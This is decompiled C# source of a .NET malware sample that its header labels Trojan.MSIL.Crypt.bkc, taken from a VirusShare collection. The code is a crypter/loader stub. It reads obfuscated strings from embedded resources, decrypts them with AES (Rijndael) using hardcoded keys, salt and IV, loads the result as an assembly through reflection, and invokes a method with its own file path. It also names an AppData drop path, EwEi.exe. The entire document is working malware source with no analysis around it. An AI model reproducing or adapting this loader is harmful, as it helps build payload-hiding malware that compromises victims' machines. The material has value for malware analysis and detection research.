// Decompiled with JetBrains decompiler
// Type: QFZQHUfONBmOkwLsKw
// Assembly: Server1, Version=7.3.10.10, Culture=neutral, PublicKeyToken=null
// MVID: FF4F77ED-B71E-4021-9596-EAE9AD26E12E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Crypt.bkc-d67f2cfb48f83bb34a78ec2403b1a9de14351511cacaeb69b7539784042fc4f9.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class QFZQHUfONBmOkwLsKw
{
  private static int ByteCount = 0;

  [STAThread]
  public static void Main()
  {
    QFZQHUfONBmOkwLsKw.ftyu();
    ProjectData.EndApp();
  }

  public static void ftyu() => QFZQHUfONBmOkwLsKw.pol();

  public static void pol()
  {
    string location = Assembly.GetExecutingAssembly().Location;
    string str = MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + "\\EwEi.exe";
    ResourceManager resourceManager = new ResourceManager("LOFet", Assembly.GetExecutingAssembly());
    string name = resourceManager.GetString("KZRCj");
    string rBYTwyfzFNDiqrpuSZ = "FtOFvJTCCppQZlO";
    string aNRqRcWolIeDuqDTiE = resourceManager.GetString("hNkDPDztMKgQagco");
    byte[] bytes1 = Encoding.Default.GetBytes(QFZQHUfONBmOkwLsKw.BlTVqTXlvQeREeBzcJ(resourceManager.GetString("GGcdmKrVkR"), "rXggfkVO"));
    Encoding.Default.GetBytes(QFZQHUfONBmOkwLsKw.BlTVqTXlvQeREeBzcJ(resourceManager.GetString("Gejgr"), "uKfg"));
    byte[] bytes2 = Encoding.Default.GetBytes(QFZQHUfONBmOkwLsKw.BlTVqTXlvQeREeBzcJ(aNRqRcWolIeDuqDTiE, rBYTwyfzFNDiqrpuSZ));
    RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(bytes1).GetType(name).GetMethod(resourceManager.GetString("UuRQ")).Invoke((object) null, new object[6]
    {
      (object) bytes2,
      (object) true,
      (object) location,
      (object) true,
      (object) false,
      (object) false
    })));
  }

  public static string BlTVqTXlvQeREeBzcJ(string aNRqRcWolIeDuqDTiE, string rBYTwyfzFNDiqrpuSZ)
  {
    string s1 = "jhsethsdutubgt";
    string s2 = "a48uyrhf094hy2dm";
    int iterations = 2;
    string strHashName = "SHA1";
    int num = 256;
    try
    {
      byte[] bytes1 = Encoding.Default.GetBytes(aNRqRcWolIeDuqDTiE);
      byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
      byte[] bytes3 = Encoding.ASCII.GetBytes(s1);
      byte[] buffer = bytes1;
      byte[] bytes4 = new PasswordDeriveBytes(rBYTwyfzFNDiqrpuSZ, bytes3, strHashName, iterations).GetBytes(checked ((int) Math.Round(unchecked ((double) num / 8.0))));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Mode = CipherMode.CBC;
      byte[] numArray = new byte[checked (buffer.Length + 1)];
      using (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes4, bytes2))
      {
        using (MemoryStream memoryStream = new MemoryStream(buffer))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
          {
            QFZQHUfONBmOkwLsKw.ByteCount = cryptoStream.Read(numArray, 0, numArray.Length);
            memoryStream.Close();
            cryptoStream.Close();
          }
        }
      }
      rijndaelManaged.Clear();
      return Encoding.Default.GetString(numArray);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      throw;
    }
  }
}
